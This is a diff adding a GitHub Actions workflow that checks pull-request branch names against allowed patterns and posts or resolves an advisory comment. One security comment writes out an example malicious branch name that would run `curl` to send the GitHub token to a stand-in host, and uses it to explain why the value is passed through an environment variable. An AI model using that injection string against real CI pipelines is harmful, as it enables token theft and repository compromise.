@@ -1,0 +1,116 @@
+name: Branch naming check
+
+# Validates PR head branch names against `.github/branch-naming.yml`.
+# Posts an advisory comment with rename suggestions if the branch name
+# doesn't match any allowed pattern. ADVISORY ONLY — does not block merge.
+#
+# To upgrade to blocking (after the violation rate hits ~zero), flip
+# `continue-on-error: true` to false and add this workflow as a required
+# status check in the branch protection ruleset.
+
+on:
+  pull_request:
+    # `edited` is intentionally excluded: it fires on title / body / base-branch
+    # edits, none of which change the head ref the script validates.
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    continue-on-error: true  # advisory — flip to false to enforce
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Install PyYAML
+        run: pip install pyyaml
+
+      - name: Validate branch name
+        id: validate
+        # Calls the same script `just check-branch-name` uses locally; the
+        # `--format=github` flag emits Actions outputs the comment steps read.
+        #
+        # SECURITY: the branch name is passed through `env:` instead of being
+        # interpolated directly into the shell. `git check-ref-format` permits
+        # `$`, backticks, and `(` `)` in ref names, so a malicious PR author
+        # could craft a head ref like `a]$(curl evil/x?t=$GITHUB_TOKEN)` and
+        # — if interpolated into a double-quoted shell argument — execute it
+        # as a command substitution. Passing via env removes that vector;
+        # the script reads the value as a plain argv string. See
+        # https://securitylab.github.com/research/github-actions-untrusted-input/
+        env:
+          BRANCH_NAME: ${{ github.event.pull_request.head.ref }}
+        run: |
+          python3 scripts/check_branch_name.py \
+            "$BRANCH_NAME" \
+            --format=github
+        continue-on-error: true  # script returns 1 on no match; we want to comment, not fail the job
+
+      - name: Find existing advisory comment
+        id: find-comment
+        uses: peter-evans/find-comment@v3
+        with:
+          issue-number: ${{ github.event.pull_request.number }}
+          comment-author: 'github-actions[bot]'
+          body-includes: '<!-- branch-naming-check:v1 -->'
+
+      - name: Post or update advisory comment (on violation)
+        if: steps.validate.outputs.matched == 'false'
+        uses: peter-evans/create-or-update-comment@v4
+        with:
+          comment-id: ${{ steps.find-comment.outputs.comment-id }}
+          issue-number: ${{ github.event.pull_request.number }}
+          edit-mode: replace
+          body: |
+            <!-- branch-naming-check:v1 -->
+            ### 🌿 Branch name doesn't match any allowed pattern
+
+            **Current branch:** `${{ steps.validate.outputs.branch }}`
+
+            **Allowed patterns** (from `.github/branch-naming.yml`):
+            - `agent-N/<verb>/adr-XXX-<slug>` — canonical agent-owned feature work
+            - `infra-N/<verb>/<slug>` — infrastructure (Pulumi) work
+            - `palette[/-]<slug>` — design-system polish (recognized alternate)
+            - `chore/<slug>` — repo-wide hygiene without a single agent owner
+
+            **Suggested renames:**
+            ${{ steps.validate.outputs.suggestions }}
+
+            **To rename this PR's branch:**
+            ```
+            gh pr edit ${{ github.event.pull_request.number }} \
+              --branch <new-name>
+            # or, if you have the branch checked out locally:
+            git branch -m <new-name>
+            git push origin -u <new-name>
+            git push origin --delete ${{ steps.validate.outputs.branch }}
+            ```
+
+            ---
+            *This check is **advisory** — it does not block merge. See [CLAUDE.md branch-naming section](../blob/main/CLAUDE.md#branch-naming) for the convention and rationale. If this is a legitimate new naming family, add a pattern to `.github/branch-naming.yml` in the same PR.*
+
+      - name: Resolve advisory comment (on rename to a compliant pattern)
+        if: steps.validate.outputs.matched == 'true' && steps.find-comment.outputs.comment-id != ''
+        uses: peter-evans/create-or-update-comment@v4
+        with:
+          comment-id: ${{ steps.find-comment.outputs.comment-id }}
+          edit-mode: replace
+          body: |
+            <!-- branch-naming-check:v1 -->
+            ### ✅ Branch name now matches an allowed pattern
+
+            **Branch:** `${{ steps.validate.outputs.branch }}`
+            **Matched pattern:** `${{ steps.validate.outputs.matched_pattern }}`
+
+            *Resolved automatically by the branch-naming check on rebranch.*
